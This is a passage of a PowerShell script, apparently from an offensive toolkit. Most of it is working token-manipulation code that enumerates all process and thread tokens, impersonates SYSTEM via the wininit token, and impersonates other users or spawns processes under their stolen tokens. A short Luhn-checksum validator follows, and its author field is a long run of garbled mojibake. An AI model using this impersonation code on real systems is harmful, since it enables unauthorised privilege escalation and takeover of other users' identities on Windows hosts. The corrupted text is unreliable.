            $Fullname = "$($Token.Domain)\$($Token.Username)"

            #Filter currently enabled privileges
            foreach ($Privilege in $Token.PrivilegesEnabled)
            {
                if ($TokenByEnabledPriv.ContainsKey($Privilege))
                {
                    if($TokenByEnabledPriv[$Privilege] -notcontains $Fullname)
                    {
                        $TokenByEnabledPriv[$Privilege] += ,$Fullname
                    }
                }
                else
                {
                    $TokenByEnabledPriv.Add($Privilege, @($Fullname))
                }
            }

            #Filter currently available (but not enable) privileges
            foreach ($Privilege in $Token.PrivilegesAvailable)
            {
                if ($TokenByAvailablePriv.ContainsKey($Privilege))
                {
                    if($TokenByAvailablePriv[$Privilege] -notcontains $Fullname)
                    {
                        $TokenByAvailablePriv[$Privilege] += ,$Fullname
                    }
                }
                else
                {
                    $TokenByAvailablePriv.Add($Privilege, @($Fullname))
                }
            }
        }

        $ReturnDict = @{
            TokenByUser = $TokenByUser
            TokenByEnabledPriv = $TokenByEnabledPriv
            TokenByAvailablePriv = $TokenByAvailablePriv
        }

        return (New-Object PSObject -Property $ReturnDict)
    }


    function Invoke-ImpersonateUser
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken
        )

        #Duplicate the token so it can be used to create a new process
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken) #todo does this need to be freed
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $Success = $ImpersonateLoggedOnUser.Invoke($NewHToken)
            if (-not $Success)
            {
                $Errorcode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to ImpersonateLoggedOnUser. Error code: $Errorcode"
            }
        }

        $Success = $CloseHandle.Invoke($NewHToken)
        $NewHToken = [IntPtr]::Zero
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
        }

        return $Success
    }


    function Create-ProcessWithToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken,

            [Parameter(Position=1, Mandatory=$true)]
            [String]
            $ProcessName,

            [Parameter(Position=2)]
            [String]
            $ProcessArgs,

            [Parameter(Position=3)]
            [Switch]
            $PassThru
        )
        Write-Verbose "Entering Create-ProcessWithToken"
        #Duplicate the token so it can be used to create a new process
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
            [IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
            $memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize) #The first parameter (cb) is a DWORD which is the size of the struct

            $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
            [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)

            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$ProcessName")
            $ProcessArgsPtr = [IntPtr]::Zero
            if (-not [String]::IsNullOrEmpty($ProcessArgs))
            {
                $ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$ProcessName`" $ProcessArgs")
            }
            
            $FunctionName = ""
            if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
            {
                #Cannot use CreateProcessWithTokenW when in Session0 because CreateProcessWithTokenW throws an ACCESS_DENIED error. I believe it is because
                #this API attempts to modify the desktop ACL. I would just use this API all the time, but it requires that I enable SeAssignPrimaryTokenPrivilege
                #which is not ideal. 
                Write-Verbose "Running in Session 0. Enabling SeAssignPrimaryTokenPrivilege and calling CreateProcessAsUserW to create a process with alternate token."
                Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
                $Success = $CreateProcessAsUserW.Invoke($NewHToken, $ProcessNamePtr, $ProcessArgsPtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
                $FunctionName = "CreateProcessAsUserW"
            }
            else
            {
                Write-Verbose "Not running in Session 0, calling CreateProcessWithTokenW to create a process with alternate token."
                $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x0, $ProcessNamePtr, $ProcessArgsPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
                $FunctionName = "CreateProcessWithTokenW"
            }
            if ($Success)
            {
                #Free the handles returned in the ProcessInfo structure
                $ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)
                $CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
                $CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null

		#Pass created System.Diagnostics.Process object to pipeline
		if ($PassThru) {
			#Retrieving created System.Diagnostics.Process object
			$returnProcess = Get-Process -Id $ProcessInfo.dwProcessId

			#Caching process handle so we don't lose it when the process exits
			$null = $returnProcess.Handle

			#Passing System.Diagnostics.Process object to pipeline
			$returnProcess
		}
            }
            else
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "$FunctionName failed. Error code: $ErrorCode"
            }

            #Free StartupInfo memory and ProcessInfo memory
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($StartupInfoPtr)
            $StartupInfoPtr = [Intptr]::Zero
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessInfoPtr)
            $ProcessInfoPtr = [IntPtr]::Zero
            [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ProcessNamePtr)
            $ProcessNamePtr = [IntPtr]::Zero

            #Close handle for the token duplicated with DuplicateTokenEx
            $Success = $CloseHandle.Invoke($NewHToken)
            $NewHToken = [IntPtr]::Zero
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
            }
        }
    }


    function Free-AllTokens
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [PSObject[]]
            $TokenInfoObjs
        )

        foreach ($Obj in $TokenInfoObjs)
        {
            $Success = $CloseHandle.Invoke($Obj.hToken)
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose "Failed to close token handle in Free-AllTokens. ErrorCode: $ErrorCode"
            }
            $Obj.hToken = [IntPtr]::Zero
        }
    }


    #Enumerate all tokens on the system. Returns an array of objects with the token and information about the token.
    function Enum-AllTokens
    {
        $AllTokens = @()

        #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
        #Even if already running as system, later parts on the script depend on having a SYSTEM token with most privileges, so impersonate the wininit token.
        $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
        if ($systemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
        {
            Write-Warning "Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"
        }

        if ($systemTokenInfo -ne $null -and $systemTokenInfo.hProcToken -ne [IntPtr]::Zero)
        {
            $CloseHandle.Invoke($systemTokenInfo.hProcToken) | Out-Null
            $systemTokenInfo = $null
        }

        $ProcessIds = get-process | where {$_.name -inotmatch "^csrss$" -and $_.name -inotmatch "^system$" -and $_.id -ne 0}

        #Get all tokens
        foreach ($Process in $ProcessIds)
        {
            $PrimaryTokenInfo = (Get-PrimaryToken -ProcessId $Process.Id -FullPrivs)

            #If a process is a protected process, it's primary token cannot be obtained. Don't try to enumerate it.
            if ($PrimaryTokenInfo -ne $null)
            {
                [IntPtr]$hToken = [IntPtr]$PrimaryTokenInfo.hProcToken

                if ($hToken -ne [IntPtr]::Zero)
                {
                    #Get the LUID corrosponding to the logon
                    $ReturnObj = Get-TokenInformation -hToken $hToken
                    if ($ReturnObj -ne $null)
                    {
                        $ReturnObj | Add-Member -MemberType NoteProperty -Name ProcessId -Value $Process.Id

                        $AllTokens += $ReturnObj
                    }
                }
                else
                {
                    Write-Warning "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id)"
                }

                foreach ($Thread in $Process.Threads)
                {
                    $ThreadTokenInfo = Get-ThreadToken -ThreadId $Thread.Id
                    [IntPtr]$hToken = ($ThreadTokenInfo.hThreadToken)

                    if ($hToken -ne [IntPtr]::Zero)
                    {
                        $ReturnObj = Get-TokenInformation -hToken $hToken
                        if ($ReturnObj -ne $null)
                        {
                            $ReturnObj | Add-Member -MemberType NoteProperty -Name ThreadId -Value $Thread.Id
                    
                            $AllTokens += $ReturnObj
                        }
                    }
                }
            }
        }

        return $AllTokens
    }


    function Invoke-RevertToSelf
    {
        Param(
            [Parameter(Position=0)]
            [Switch]
            $ShowOutput
        )

        $Success = $RevertToSelf.Invoke()

        if ($ShowOutput)
        {
            if ($Success)
            {
                Write-Output "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
            else
            {
                Write-Output "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
        }
    }


    #Main function
    function Main
    {   
        #If running in session 0, force NoUI
        if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
        {
            Write-Verbose "Running in Session 0, forcing NoUI (processes in Session 0 cannot have a UI)"
            $NoUI = $true
        }

        if ($PsCmdlet.ParameterSetName -ieq "RevToSelf")
        {
            Invoke-RevertToSelf -ShowOutput
        }
        elseif ($PsCmdlet.ParameterSetName -ieq "CreateProcess" -or $PsCmdlet.ParameterSetName -ieq "ImpersonateUser")
        {
            $AllTokens = Enum-AllTokens
            
            #Select the token to use
            [IntPtr]$hToken = [IntPtr]::Zero
            $UniqueTokens = (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser
            if ($Username -ne $null -and $Username -ne '')
            {
                if ($UniqueTokens.ContainsKey($Username))
                {
                    $hToken = $UniqueTokens[$Username].hToken
                    Write-Verbose "Selecting token by username"
                }
                else
                {
                    Write-Error "A token belonging to the specified username was not found. Username: $($Username)" -ErrorAction Stop
                }
            }
            elseif ( $ProcessId -ne $null -and $ProcessId -ne 0)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | Get-Member ProcessId) -and $Token.ProcessId -eq $ProcessId)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose "Selecting token by ProcessID"
                    }
                }

                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($ThreadId -ne $null -and $ThreadId -ne 0)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | Get-Member ThreadId) -and $Token.ThreadId -eq $ThreadId)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose "Selecting token by ThreadId"
                    }
                }

                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($Process -ne $null)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | Get-Member ProcessId) -and $Token.ProcessId -eq $Process.Id)
                    {
                        $hToken = $Token.hToken

                        if($Instance){
                            Write-Verbose "$Instance : Selecting token by Process object"
                        }else{
                            Write-Verbose "Selecting token by Process object"
                        }
                    }
                }

                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            else
            {
                Write-Error "Must supply a Username, ProcessId, ThreadId, or Process object"  -ErrorAction Stop
            }

            #Use the token for the selected action
            if ($PsCmdlet.ParameterSetName -ieq "CreateProcess")
            {
                if (-not $NoUI)
                {
                    Set-DesktopACLs
                }

                Create-ProcessWithToken -hToken $hToken -ProcessName $CreateProcess -ProcessArgs $ProcessArgs -PassThru:$PassThru

                Invoke-RevertToSelf
            }
            elseif ($ImpersonateUser)
            {
                Invoke-ImpersonateUser -hToken $hToken | Out-Null
                Write-Output "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }

            Free-AllTokens -TokenInfoObjs $AllTokens
        }
        elseif ($PsCmdlet.ParameterSetName -ieq "WhoAmI")
        {
            Write-Output "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
        else #Enumerate tokens
        {
            $AllTokens = Enum-AllTokens

            if ($PsCmdlet.ParameterSetName -ieq "ShowAll")
            {
                Write-Output $AllTokens
            }
            else
            {
                Write-Output (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser.Values
            }

            Invoke-RevertToSelf

            Free-AllTokens -TokenInfoObjs $AllTokens
        }
    }


    #Start the main function
    Main
}


# -------------------------------------------
# Function: Test-IsLuhnValid
# -------------------------------------------
# Author: ktaranov
# Source: https://communary.net/2016/02/19/the-luhn-algorithm/
function Test-IsLuhnValid
{
    <#
            .SYNOPSIS
            Valdidate a number based on the Luhn Algorithm.
            .DESCRIPTION
            This function uses the Luhn algorithm to validate a number that includes
            the Luhn checksum digit.
            .EXAMPLE
            Test-IsLuhnValid -Number 1234567890123452
            This will validate whether the number is valid according to the Luhn Algorithm.
            .INPUTS
            System.UInt64
            .OUTPUTS
            System.Boolean
            .NOTES
            Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â 